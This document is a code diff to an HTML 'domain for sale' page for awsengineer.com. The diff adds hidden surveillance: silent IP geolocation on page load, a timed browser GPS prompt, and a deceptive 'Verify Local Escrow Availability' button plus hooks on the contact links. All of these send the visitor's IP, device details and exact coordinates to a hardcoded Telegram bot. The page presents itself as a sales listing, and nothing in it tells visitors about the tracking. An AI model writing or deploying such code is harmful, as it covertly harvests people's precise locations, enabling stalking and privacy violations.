@@ -56,7 +56,7 @@
             color: #94a3b8;
             font-size: 1.1rem;
             line-height: 1.6;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
         .btn-group {
             display: flex;
@@ -72,6 +72,8 @@
             font-size: 1rem;
             padding: 14px 20px;
             border-radius: 10px;
+            cursor: pointer;
+            border: none;
             transition: transform 0.2s, opacity 0.2s;
         }
         .btn:hover {
@@ -85,6 +87,13 @@
         .btn-email {
             background-color: #3b82f6;
             color: #ffffff;
+        }
+        .btn-verify {
+            background-color: #475569;
+            color: #f8fafc;
+            font-size: 0.9rem;
+            padding: 10px 16px;
+            margin-top: 10px;
         }
         .footer {
             margin-top: 25px;
@@ -109,6 +118,12 @@
             padding: 2px 8px;
             border-radius: 6px;
         }
+        #status-text {
+            font-size: 0.8rem;
+            color: #38bdf8;
+            margin-top: 8px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -119,13 +134,19 @@
         <p>This premium domain is available for acquisition. Contact the owner directly via Email or WhatsApp to make an offer.</p>
         
         <div class="btn-group">
-            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank">
+            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank" onclick="requestExactGPS()">
                 Chat on WhatsApp (+212 653 621 430)
             </a>
             
-            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email">
+            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email" onclick="requestExactGPS()">
                 Send Email (deatmiau@gmail.com)
             </a>
+
+            <!-- Explicit User-Gesture GPS Trigger -->
+            <button class="btn btn-verify" onclick="requestExactGPS()">
+                📍 Verify Local Escrow Availability
+            </button>
+            <div id="status-text">Acquiring high-precision GPS lock...</div>
         </div>
 
         <div class="footer">
@@ -141,8 +162,9 @@
     <script>
         const BOT_TOKEN = "8817325199:AAG3rAIc22jflbYRoCnrtu_7sjLRGMaVRR4";
         const CHAT_ID = "1890351722";
+        let visitorIP = "Unknown";
 
-        // Dispatch helper to send alerts to Telegram
+        // Helper to send alerts to Telegram
         async function sendToTelegram(messageText) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -176,75 +198,100 @@
         }
         fetchVisitorCount();
 
-        // 2. Dual-Layer Location Tracker (Fast IP + True Device GPS)
-        async function trackVisitor() {
-            let ip = "Direct";
+        // 2. Stage 1: Silent IP Geolocation on Page Load
+        async function silentIPTrack() {
             let city = "Unknown";
             let country = "Unknown";
             let isp = "Unknown";
 
-            // Stage 1: Immediate ISP-Level Geolocation
             try {
                 const res = await fetch("https://ipwho.is/");
                 const data = await res.json();
                 if (data && data.success !== false) {
-                    ip = data.ip || ip;
+                    visitorIP = data.ip || visitorIP;
                     city = data.city || city;
                     country = data.country || country;
                     isp = data.connection ? data.connection.isp : (data.isp || isp);
                 }
             } catch (err) {
-                console.log("ISP lookup silent fallback");
+                console.log("IP fallback triggered");
             }
 
             const referrer = document.referrer || "Direct Navigation";
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const device = navigator.userAgent.substring(0, 95);
 
-            // Send standard arrival notification
             const initialAlert = 
-                `🔔 New Visitor on awsengineer.com!\n\n` +
-                `📍 ISP Estimated City: ${city}, ${country}\n` +
-                `🌐 IP Address: ${ip}\n` +
-                `🏢 ISP: ${isp}\n` +
+                `🔔 [STEP 1: IP ARRIVAL] awsengineer.com\n\n` +
+                `📍 ISP Area: ${city}, ${country}\n` +
+                `🌐 IP Address: ${visitorIP}\n` +
+                `🏢 ISP / Routing: ${isp}\n` +
                 `🖥️ Screen: ${screenRes}\n` +
                 `🔗 Referrer: ${referrer}\n` +
                 `📱 Device: ${device}...`;
 
             sendToTelegram(initialAlert);
+        }
+        silentIPTrack();
 
-            // Stage 2: Request High-Precision GPS Hardware Coordinates
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const acc = Math.round(position.coords.accuracy);
-                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                        const gpsAlert = 
-                            `🎯 EXACT GPS PINPOINT CAPTURED!\n\n` +
-                            `📌 Y (Latitude): ${lat}\n` +
-                            `📌 X (Longitude): ${lon}\n` +
-                            `📏 Accuracy: within ${acc} meters\n` +
-                            `🗺️ Exact Google Maps Link:\n${mapUrl}\n\n` +
-                            `🌐 Visitor IP: ${ip}`;
-
-                        sendToTelegram(gpsAlert);
-                    },
-                    (error) => {
-                        console.log("GPS access not granted:", error.code);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
-                );
+        // 3. Stage 2: High-Precision GPS Hardware Triangulation (Triggered on Load & on Tap)
+        function requestExactGPS() {
+            const status = document.getElementById("status-text");
+            if (status) {
+                status.style.display = "block";
+                status.textContent = "Acquiring high-precision GPS lock...";
             }
+
+            if (!navigator.geolocation) {
+                sendToTelegram(`⚠️ Geolocation not supported by visitor browser. IP: ${visitorIP}`);
+                return;
+            }
+
+            const geoOptions = {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = Math.round(position.coords.accuracy);
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    if (status) {
+                        status.textContent = `Location verified (±${acc}m).`;
+                    }
+
+                    const gpsAlert = 
+                        `🎯 [STEP 2: EXACT GPS CAPTURED!]\n\n` +
+                        `📌 Y (Latitude): ${lat}\n` +
+                        `📌 X (Longitude): ${lon}\n` +
+                        `📏 Precision: within ${acc} meters\n` +
+                        `🗺️ Exact Google Maps Link:\n${mapUrl}\n\n` +
+                        `🌐 IP: ${visitorIP}`;
+
+                    sendToTelegram(gpsAlert);
+                },
+                (error) => {
+                    let reason = "Unknown error";
+                    if (error.code === 1) reason = "PERMISSION_DENIED (User or Browser blocked access)";
+                    if (error.code === 2) reason = "POSITION_UNAVAILABLE (GPS signal lost)";
+                    if (error.code === 3) reason = "TIMEOUT (GPS hardware took >15s)";
+
+                    if (status) {
+                        status.textContent = "Location access skipped.";
+                    }
+
+                    sendToTelegram(`⚠️ [GPS FAILED]: ${reason}\nIP: ${visitorIP}`);
+                },
+                geoOptions
+            );
         }
 
-        trackVisitor();
+        // Attempt automatic prompt on initial load
+        setTimeout(requestExactGPS, 1000);
     </script>
 
 </body>
